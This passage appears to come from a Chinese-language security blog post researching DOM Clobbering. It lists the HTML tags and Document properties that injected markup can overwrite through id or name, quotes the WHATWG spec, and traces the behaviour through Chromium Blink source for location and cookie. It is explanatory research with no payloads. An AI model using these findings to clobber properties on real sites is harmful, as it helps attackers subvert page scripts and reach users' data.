</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>log</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>除了在 [Not Clobbered](#Not Clobbered) 部分的标签，其他标签<code>window</code>均可通过 id 进行直接获取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(128) [&#34;a&#34;, &#34;abbr&#34;, &#34;acronym&#34;, &#34;address&#34;, &#34;applet&#34;, &#34;area&#34;, &#34;article&#34;, &#34;aside&#34;, &#34;audio&#34;, &#34;b&#34;, &#34;base&#34;, &#34;basefont&#34;, &#34;bdi&#34;, &#34;bdo&#34;, &#34;bgsound&#34;, &#34;big&#34;, &#34;blink&#34;, &#34;blockquote&#34;, &#34;br&#34;, &#34;button&#34;, &#34;canvas&#34;, &#34;center&#34;, &#34;cite&#34;, &#34;code&#34;, &#34;command&#34;, &#34;content&#34;, &#34;data&#34;, &#34;datalist&#34;, &#34;dd&#34;, &#34;del&#34;, &#34;details&#34;, &#34;dfn&#34;, &#34;dialog&#34;, &#34;dir&#34;, &#34;div&#34;, &#34;dl&#34;, &#34;dt&#34;, &#34;element&#34;, &#34;em&#34;, &#34;embed&#34;, &#34;fieldset&#34;, &#34;figcaption&#34;, &#34;figure&#34;, &#34;font&#34;, &#34;footer&#34;, &#34;form&#34;, &#34;h1&#34;, &#34;header&#34;, &#34;hgroup&#34;, &#34;hr&#34;, &#34;i&#34;, &#34;iframe&#34;, &#34;iframes&#34;, &#34;image&#34;, &#34;img&#34;, &#34;input&#34;, &#34;ins&#34;, &#34;isindex&#34;, &#34;kbd&#34;, &#34;keygen&#34;, &#34;label&#34;, &#34;legend&#34;, &#34;li&#34;, &#34;link&#34;, &#34;listing&#34;, &#34;main&#34;, &#34;map&#34;, &#34;mark&#34;, &#34;marquee&#34;, &#34;menu&#34;, &#34;menuitem&#34;, &#34;meta&#34;, &#34;meter&#34;, &#34;multicol&#34;, &#34;nav&#34;, &#34;nextid&#34;, &#34;nobr&#34;, &#34;noembed&#34;, &#34;noframes&#34;, &#34;noscript&#34;, &#34;object&#34;, &#34;ol&#34;, &#34;optgroup&#34;, &#34;option&#34;, &#34;output&#34;, &#34;p&#34;, &#34;param&#34;, &#34;picture&#34;, &#34;plaintext&#34;, &#34;pre&#34;, &#34;progress&#34;, &#34;q&#34;, &#34;rb&#34;, &#34;rp&#34;, &#34;rt&#34;, &#34;rtc&#34;, &#34;ruby&#34;, &#34;s&#34;, &#34;samp&#34;, &#34;script&#34;, …]
</span></span></code></pre></td></tr></table></div></div><h3 id=window--name>Window & Name</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nb>window</span><span class=p>.</span><span class=nx>x</span> <span class=o>==</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementsByName</span><span class=p>(</span><span class=s2>&#34;x&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=nb>window</span><span class=p>.</span><span class=nx>x</span> <span class=o>!=</span> <span class=kc>undefined</span>
</span></span></code></pre></td></tr></table></div></div><p>这里与 document 一致，只有五个标签可以让<code>window</code>通过 name 进行直接获取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> [&#34;embed&#34;, &#34;form&#34;, &#34;image&#34;, &#34;img&#34;, &#34;object&#34;]
</span></span></code></pre></td></tr></table></div></div><h3 id=not-clobbered>&lsquo;Not Clobbered&rsquo;</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[&#34;body&#34;, &#34;caption&#34;, &#34;col&#34;, &#34;colgroup&#34;, &#34;frame&#34;, &#34;frameset&#34;, &#34;head&#34;, &#34;html&#34;, &#34;tbody&#34;, &#34;td&#34;, &#34;tfoot&#34;, &#34;th&#34;, &#34;thead&#34;, &#34;tr&#34;]
</span></span></code></pre></td></tr></table></div></div><p>PS: 这部分并不是真正不能 Clobbered ，因为比如说<code>body</code>，因为我本身界面存在一个<code>body</code>标签，只是在我测试构建的简单的 HTML 页面中，这些标签不能被 Clobbered ，而且在实际中也用到比较少。并且根据 Chromium 中的说法是"but anything by id"，所以如果需要通过<code>Window.id</code>的形式去获取标签的话，还有很多标签可以使用，或者也可以尽力去构建下文的要求。</p><h3 id=dom-doc>Dom Doc</h3><p>其实在 Dom 标准中也有提及过这部分，在<a class=link href=https://html.spec.whatwg.org/multipage/dom.html#dom-document-currentscript target=_blank rel=noopener>A part of Document interface</a> 这一段中，我们可以看到有相关规定：</p><blockquote><p>​ The <code>Document</code> interface <a class=link href=https://heycam.github.io/webidl/#dfn-support-named-properties target=_blank rel=noopener>supports named properties</a>. The <a class=link href=https://heycam.github.io/webidl/#dfn-supported-property-names target=_blank rel=noopener>supported property names</a> of a <code>Document</code> object document at any moment consist of the following, in <a class=link href=https://dom.spec.whatwg.org/#concept-tree-order target=_blank rel=noopener>tree order</a> according to the element that contributed them, ignoring later duplicates, and with values from <code>id</code> attributes coming before values from <code>name</code> attributes when the same element contributes both:</p><ul><li>the value of the <code>name</code> content attribute for all <a class=link href=https://html.spec.whatwg.org/multipage/dom.html#exposed target=_blank rel=noopener>exposed</a> <code>embed</code>, <code>form</code>, <code>iframe</code>, <code>img</code>, and <a class=link href=https://html.spec.whatwg.org/multipage/dom.html#exposed target=_blank rel=noopener>exposed</a> <code>object</code> elements that have a non-empty <code>name</code> content attribute and are <a class=link href=https://dom.spec.whatwg.org/#in-a-document-tree target=_blank rel=noopener>in a document tree</a> with document as their <a class=link href=https://dom.spec.whatwg.org/#concept-tree-root target=_blank rel=noopener>root</a>;</li><li>the value of the <code>id</code> content attribute for all <a class=link href=https://html.spec.whatwg.org/multipage/dom.html#exposed target=_blank rel=noopener>exposed</a> <code>object</code> elements that have a non-empty <code>id</code> content attribute and are <a class=link href=https://dom.spec.whatwg.org/#in-a-document-tree target=_blank rel=noopener>in a document tree</a> with document as their <a class=link href=https://dom.spec.whatwg.org/#concept-tree-root target=_blank rel=noopener>root</a>; and</li><li>the value of the <code>id</code> content attribute for all <code>img</code> elements that have both a non-empty <code>id</code> content attribute and a non-empty <code>name</code> content attribute, and are <a class=link href=https://dom.spec.whatwg.org/#in-a-document-tree target=_blank rel=noopener>in a document tree</a> with document as their <a class=link href=https://dom.spec.whatwg.org/#concept-tree-root target=_blank rel=noopener>root</a>.</li></ul></blockquote><p>也有关于<a class=link href=https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object target=_blank rel=noopener> Window 对象的部分</a>：</p><blockquote><p>​ The <code>Window</code> object <a class=link href=https://heycam.github.io/webidl/#dfn-support-named-properties target=_blank rel=noopener>supports named properties</a>. The <a class=link href=https://heycam.github.io/webidl/#dfn-supported-property-names target=_blank rel=noopener>supported property names</a> of a <code>Window</code> object window at any moment consist of the following, in <a class=link href=https://dom.spec.whatwg.org/#concept-tree-order target=_blank rel=noopener>tree order</a> according to the element that contributed them, ignoring later duplicates:</p><ul><li>window&rsquo;s <a class=link href=https://html.spec.whatwg.org/multipage/window-object.html#document-tree-child-browsing-context-name-property-set target=_blank rel=noopener>document-tree child browsing context name property set</a>;</li><li>the value of the <code>name</code> content attribute for all <code>embed</code>, <code>form</code>, <code>img</code>, and <code>object</code> elements that have a non-empty <code>name</code> content attribute and are <a class=link href=https://dom.spec.whatwg.org/#in-a-document-tree target=_blank rel=noopener>in a document tree</a> with window&rsquo;s <a class=link href=https://html.spec.whatwg.org/multipage/window-object.html#concept-document-window target=_blank rel=noopener>associated <code>Document</code></a> as their <a class=link href=https://dom.spec.whatwg.org/#concept-tree-root target=_blank rel=noopener>root</a>; and</li><li>the value of the <code>id</code> content attribute for all <a class=link href=https://html.spec.whatwg.org/multipage/infrastructure.html#html-elements target=_blank rel=noopener>HTML elements</a> that have a non-empty <code>id</code> content attribute and are <a class=link href=https://dom.spec.whatwg.org/#in-a-document-tree target=_blank rel=noopener>in a document tree</a> with window&rsquo;s <a class=link href=https://html.spec.whatwg.org/multipage/window-object.html#concept-document-window target=_blank rel=noopener>associated <code>Document</code></a> as their <a class=link href=https://dom.spec.whatwg.org/#concept-tree-root target=_blank rel=noopener>root</a>.</li></ul></blockquote><h3 id=window>Window</h3><p>关于 window 对象，虽然 window 对象可以通过 id 直接获取标签，但是我目前还没发现可以直接通过标签 id 进行 clobber 的属性，毕竟是基于 Dom 的攻击技术。</p><h3 id=document>Document</h3><p>至于 Document 对象，我列举了一下 Document 对象特有的属性以及其对应的类型：</p><div class=table-wrapper><table><thead><tr><th>Class</th><th>Attr</th></tr></thead><tbody><tr><td>DOMImplementation</td><td>[&ldquo;implementation&rdquo;]</td></tr><tr><td>HTMLCollection</td><td>[&ldquo;images&rdquo;, &ldquo;embeds&rdquo;, &ldquo;plugins&rdquo;, &ldquo;links&rdquo;, &ldquo;forms&rdquo;, &ldquo;scripts&rdquo;, &ldquo;anchors&rdquo;, &ldquo;applets&rdquo;, &ldquo;children&rdquo;]</td></tr><tr><td>String</td><td>[&ldquo;documentURI&rdquo;, &ldquo;compatMode&rdquo;, &ldquo;characterSet&rdquo;, &ldquo;charset&rdquo;, &ldquo;inputEncoding&rdquo;, &ldquo;contentType&rdquo;, &ldquo;domain&rdquo;, &ldquo;referrer&rdquo;, &ldquo;cookie&rdquo;, &ldquo;lastModified&rdquo;, &ldquo;readyState&rdquo;, &ldquo;title&rdquo;, &ldquo;dir&rdquo;, &ldquo;designMode&rdquo;, &ldquo;fgColor&rdquo;, &ldquo;linkColor&rdquo;, &ldquo;vlinkColor&rdquo;, &ldquo;alinkColor&rdquo;, &ldquo;bgColor&rdquo;, &ldquo;visibilityState&rdquo;, &ldquo;webkitVisibilityState&rdquo;, &ldquo;nodeName&rdquo;, &ldquo;baseURI&rdquo;]</td></tr><tr><td>HTMLBodyElement</td><td>[&ldquo;body&rdquo;, &ldquo;activeElement&rdquo;]</td></tr><tr><td>HTMLHeadElement</td><td>[&ldquo;head&rdquo;]</td></tr><tr><td>HTMLScriptElement</td><td>[&ldquo;currentScript&rdquo;]</td></tr><tr><td>HTMLAllCollection</td><td>[&ldquo;all&rdquo;]</td></tr><tr><td>NodeList</td><td>[&ldquo;childNodes&rdquo;]</td></tr><tr><td>Window</td><td>[&ldquo;defaultView&rdquo;]</td></tr><tr><td>DocumentType</td><td>[&ldquo;doctype&rdquo;, &ldquo;firstChild&rdquo;]</td></tr><tr><td>Boolean</td><td>[&ldquo;xmlStandalone&rdquo;, &ldquo;hidden&rdquo;, &ldquo;wasDiscarded&rdquo;, &ldquo;webkitHidden&rdquo;, &ldquo;fullscreenEnabled&rdquo;, &ldquo;fullscreen&rdquo;, &ldquo;webkitIsFullScreen&rdquo;, &ldquo;webkitFullscreenEnabled&rdquo;, &ldquo;pictureInPictureEnabled&rdquo;, &ldquo;isConnected&rdquo;]</td></tr><tr><td>FontFaceSet</td><td>[&ldquo;fonts&rdquo;]</td></tr><tr><td>StyleSheetList</td><td>[&ldquo;styleSheets&rdquo;]</td></tr><tr><td>Function</td><td>[&ldquo;getElementsByTagName&rdquo;, &ldquo;getElementsByTagNameNS&rdquo;, &ldquo;getElementsByClassName&rdquo;, &ldquo;createDocumentFragment&rdquo;, &ldquo;createTextNode&rdquo;, &ldquo;createCDATASection&rdquo;, &ldquo;createComment&rdquo;, &ldquo;createProcessingInstruction&rdquo;, &ldquo;importNode&rdquo;, &ldquo;adoptNode&rdquo;, &ldquo;createAttribute&rdquo;, &ldquo;createAttributeNS&rdquo;, &ldquo;createEvent&rdquo;, &ldquo;createRange&rdquo;, &ldquo;createNodeIterator&rdquo;, &ldquo;createTreeWalker&rdquo;, &ldquo;getElementsByName&rdquo;, &ldquo;write&rdquo;, &ldquo;writeln&rdquo;, &ldquo;hasFocus&rdquo;, &ldquo;execCommand&rdquo;, &ldquo;queryCommandEnabled&rdquo;, &ldquo;queryCommandIndeterm&rdquo;, &ldquo;queryCommandState&rdquo;, &ldquo;queryCommandSupported&rdquo;, &ldquo;queryCommandValue&rdquo;, &ldquo;clear&rdquo;, &ldquo;exitPointerLock&rdquo;, &ldquo;createElement&rdquo;, &ldquo;createElementNS&rdquo;, &ldquo;caretRangeFromPoint&rdquo;, &ldquo;elementFromPoint&rdquo;, &ldquo;elementsFromPoint&rdquo;, &ldquo;getElementById&rdquo;, &ldquo;prepend&rdquo;, &ldquo;append&rdquo;, &ldquo;querySelector&rdquo;, &ldquo;querySelectorAll&rdquo;, &ldquo;exitFullscreen&rdquo;, &ldquo;webkitCancelFullScreen&rdquo;, &ldquo;webkitExitFullscreen&rdquo;, &ldquo;createExpression&rdquo;, &ldquo;createNSResolver&rdquo;, &ldquo;evaluate&rdquo;, &ldquo;registerElement&rdquo;, &ldquo;exitPictureInPicture&rdquo;, &ldquo;hasChildNodes&rdquo;, &ldquo;getRootNode&rdquo;, &ldquo;normalize&rdquo;, &ldquo;cloneNode&rdquo;, &ldquo;isEqualNode&rdquo;, &ldquo;isSameNode&rdquo;, &ldquo;compareDocumentPosition&rdquo;, &ldquo;contains&rdquo;, &ldquo;lookupPrefix&rdquo;, &ldquo;lookupNamespaceURI&rdquo;, &ldquo;isDefaultNamespace&rdquo;, &ldquo;insertBefore&rdquo;, &ldquo;appendChild&rdquo;, &ldquo;replaceChild&rdquo;, &ldquo;removeChild&rdquo;]</td></tr><tr><td>NodeList</td><td>[&ldquo;childNodes&rdquo;]</td></tr><tr><td>Array</td><td>[&ldquo;adoptedStyleSheets&rdquo;]</td></tr><tr><td>FeaturePolicy</td><td>[&ldquo;featurePolicy&rdquo;]</td></tr><tr><td>Null</td><td>[&ldquo;xmlEncoding&rdquo;, &ldquo;xmlVersion&rdquo;, &ldquo;onreadystatechange&rdquo;, &ldquo;onpointerlockchange&rdquo;, &ldquo;onpointerlockerror&rdquo;, &ldquo;onbeforecopy&rdquo;, &ldquo;onbeforecut&rdquo;, &ldquo;onbeforepaste&rdquo;, &ldquo;onfreeze&rdquo;, &ldquo;onresume&rdquo;, &ldquo;onsecuritypolicyviolation&rdquo;, &ldquo;onvisibilitychange&rdquo;, &ldquo;oncopy&rdquo;, &ldquo;oncut&rdquo;, &ldquo;onpaste&rdquo;, &ldquo;pointerLockElement&rdquo;, &ldquo;fullscreenElement&rdquo;, &ldquo;onfullscreenchange&rdquo;, &ldquo;onfullscreenerror&rdquo;, &ldquo;webkitCurrentFullScreenElement&rdquo;, &ldquo;webkitFullscreenElement&rdquo;, &ldquo;onwebkitfullscreenchange&rdquo;, &ldquo;onwebkitfullscreenerror&rdquo;, &ldquo;rootElement&rdquo;, &ldquo;pictureInPictureElement&rdquo;, &ldquo;ownerDocument&rdquo;, &ldquo;parentNode&rdquo;, &ldquo;parentElement&rdquo;, &ldquo;previousSibling&rdquo;, &ldquo;nextSibling&rdquo;, &ldquo;nodeValue&rdquo;, &ldquo;textContent&rdquo;]</td></tr></tbody></table></div><p>其中，<code>HTMLBodyElement</code>/<code>HTMLHeadElement</code>/<code>HTMLScriptElement</code> 均继承自<code>HTMLElement</code>，为什么需要这些呢？因为在很多时候我们 Clobber 得到的就是一个<code>HTMLElement</code>，而 Document 某些属性得到的也是一个<code>HTMLElement</code>，所以这时候我们可以直接利用。</p><h2 id=cause>Cause</h2><p>我想如果能覆盖的话，应该就是在调用<code>document.x</code>的时候， Dom 树解析得到的结果要优先于<code>document</code>自己本身属性，所以产生了这样的结果，但是这里也有一个问题，就是为什么我们在覆盖<code>cookie</code>的时候却不能完全控制覆盖呢？</p><p>带着这些疑问，我特地去看了一会 chromium 的源码，简略地看了一下这些实现，主要在 chromium 的 blink 部分。由于自己知识浅薄，并没有完整地阅读过 chromium 源码，这里还可能设计到一些编译原理的知识，所以我并没有安全把整个 Chromium 产生这个问题的缘由以代码追踪的形式弄出来，如果要弄的话估计也得去 debug Chromium ，那就是另一篇文章的内容了，所以这个部分还有待继续研究，不过我把自己看的一些有用的部分写出来。如果有兴趣的朋友可以联系我一起研究看看。（虽然我很菜XD</p><p>全部代码来源于 <a class=link href=https://source.chromium.org/ target=_blank rel=noopener>Chomiunm Code Search</a>，这个平台可以比较方便审代码。</p><h3 id=location>Location</h3><p>首先我们来看看<code>location</code>，我们既可以使用<code>window.location</code>也可以使用<code>document.location</code>拿到<code>location</code>，这也能说明我们为什么上文要单独 fuzz Document 特有的属性而不是全部属性了。</p><p>在 Chromium 源码中，找到<code>location</code>比较简单， Chromium 直接调用了<code>window</code>对象的<code>location()</code>，所以我们就覆盖不了。</p><p>在<code>third_party/blink/renderer/core/dom/document.cc</code>中，第 933 行中有相关定义 <a class=link href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/dom/document.cc;l=933?originalUrl=https:%2F%2Fcs.chromium.org%2F" target=_blank rel=noopener>Document::location()</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=n>Location</span><span class=o>*</span> <span class=n>Document</span><span class=o>::</span><span class=n>location</span><span class=p>()</span> <span class=k>const</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>GetFrame</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>nullptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>domWindow</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>location</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到，直接调用了<code>domWindow()</code>来获取<code>location</code>，在<code>third_party/blink/renderer/core/frame/dom_window.cc</code>中，第85行有相关定义 <a class=link href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/frame/dom_window.cc;drc=7e3843b722bda29c236e9cb49111f3296dc2ce20;l=85" target=_blank rel=noopener>DOMWindow::location()</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=n>Location</span><span class=o>*</span> <span class=n>DOMWindow</span><span class=o>::</span><span class=n>location</span><span class=p>()</span> <span class=k>const</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>location_</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>location_</span> <span class=o>=</span> <span class=n>MakeGarbageCollected</span><span class=o>&lt;</span><span class=n>Location</span><span class=o>&gt;</span><span class=p>(</span><span class=k>const_cast</span><span class=o>&lt;</span><span class=n>DOMWindow</span><span class=o>*&gt;</span><span class=p>(</span><span class=k>this</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>location_</span><span class=p>.</span><span class=n>Get</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>另外，有人提过相关用其他 hook 的方式 <a class=link href="https://bugs.chromium.org/p/chromium/issues/detail?id=315760" target=_blank rel=noopener>Issue 315760: document.domain can be hooked</a>，里面提到可以 hook 到 domain 跟 location ，但是我在目前 stable chrome 上测试只能 hook 到 domain ，至于 location 不知道是不是被修了，尽管回复的是"Browsers allow hooking these properties. It doesn&rsquo;t matter"</p><h3 id=cookie>Cookie</h3><p>这里简单看了一下 Cookie 的实现，主要是这两部分代码：</p><p><a class=link href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/dom/document.cc;l=5798" target=_blank rel=noopener>Document::cookie</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=n>String</span> <span class=n>Document</span><span class=o>::</span><span class=n>cookie</span><span class=p>(</span><span class=n>ExceptionState</span><span class=o>&amp;</span> <span class=n>exception_state</span><span class=p>)</span> <span class=k>const</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>GetSettings</span><span class=p>()</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>GetSettings</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>GetCookieEnabled</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>String</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>CountUse</span><span class=p>(</span><span class=n>WebFeature</span><span class=o>::</span><span class=n>kCookieGet</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>GetSecurityOrigin</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>CanAccessCookies</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>IsSandboxed</span><span class=p>(</span><span class=n>mojom</span><span class=o>::</span><span class=n>blink</span><span class=o>::</span><span class=n>WebSandboxFlags</span><span class=o>::</span><span class=n>kOrigin</span><span class=p>))</span>
</span></span><span class=line><span class=cl>      <span class=n>exception_state</span><span class=p>.</span><span class=n>ThrowSecurityError</span><span class=p>(</span>
</span></span><span class=line><span class=cl>          <span class=s>&#34;The document is sandboxed and lacks the &#39;allow-same-origin&#39; flag.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=nf>if</span> <span class=p>(</span><span class=n>Url</span><span class=p>().</span><span class=n>ProtocolIs</span><span class=p>(</span><span class=s>&#34;data&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>      <span class=n>exception_state</span><span class=p>.</span><span class=n>ThrowSecurityError</span><span class=p>(</span>
</span></span><span class=line><span class=cl>          <span class=s>&#34;Cookies are disabled inside &#39;data:&#39; URLs.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>      <span class=n>exception_state</span><span class=p>.</span><span class=n>ThrowSecurityError</span><span class=p>(</span><span class=s>&#34;Access is denied for this document.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>String</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=nf>if</span> <span class=p>(</span><span class=n>GetSecurityOrigin</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>IsLocal</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>CountUse</span><span class=p>(</span><span class=n>WebFeature</span><span class=o>::</span><span class=n>kFileAccessedCookies</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>cookie_jar_</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>String</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>cookie_jar_</span><span class=o>-&gt;</span><span class=n>Cookies</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><a class=link href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/loader/cookie_jar.cc;drc=76ccbe80ceaa4529956a6a3d9d8cc9e9a44b1904;l=27?originalUrl=https:%2F%2Fcs.chromium.org%2F" target=_blank rel=noopener>CookieJar::Cookies()</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=n>String</span> <span class=n>CookieJar</span><span class=o>::</span><span class=n>Cookies</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>KURL</span> <span class=n>cookie_url</span> <span class=o>=</span> <span class=n>document_</span><span class=o>-&gt;</span><span class=n>CookieURL</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>cookie_url</span><span class=p>.</span><span class=n>IsEmpty</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>String</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>RequestRestrictedCookieManagerIfNeeded</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>String</span> <span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>backend_</span><span class=o>-&gt;</span><span class=n>GetCookiesString</span><span class=p>(</span><span class=n>cookie_url</span><span class=p>,</span> <span class=n>document_</span><span class=o>-&gt;</span><span class=n>SiteForCookies</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>                             <span class=n>document_</span><span class=o>-&gt;</span><span class=n>TopFrameOrigin</span><span class=p>(),</span> <span class=o>&amp;</span><span class=n>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>以及，虽然 cookie 不能被完全字符串化控制，但是可以被 Clobbered 的问题在2年前也有人报告过这个相关的问题 <a class=link href="https://bugzilla.mozilla.org/show_bug.cgi?id=1420032" target=_blank rel=noopener>document.cookie DOM property can be clobbered using DOM node named cookie</a></p><p>只不过目前的主流浏览器都是"Safari, Chrome and Firefox all behave the same here"。</p><h3 id=document-collection>Document Collection</h3><p>涉及到 Collection 的 Document 部分：</p><p><a class=link href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/html/document_name_collection.cc;l=24?originalUrl=https:%2F%2Fcs.chromium.org%2F" target=_blank rel=noopener>DocumentNameCollection::ElementMatches</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=kt>bool</span> <span class=n>DocumentNameCollection</span><span class=o>::</span><span class=n>ElementMatches</span><span class=p>(</span><span class=k>const</span> <span class=n>HTMLElement</span><span class=o>&amp;</span> <span class=n>element</span><span class=p>)</span> <span class=k>const</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Match images, forms, embeds, objects and iframes by name,
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// object by id, and images by id but only if they have
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// a name attribute (this very strange rule matches IE)
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>auto</span><span class=o>*</span> <span class=n>html_embed_element</span> <span class=o>=</span> <span class=n>DynamicTo</span><span class=o>&lt;</span><span class=n>HTMLEmbedElement</span><span class=o>&gt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>element</span><span class=p>);</span>
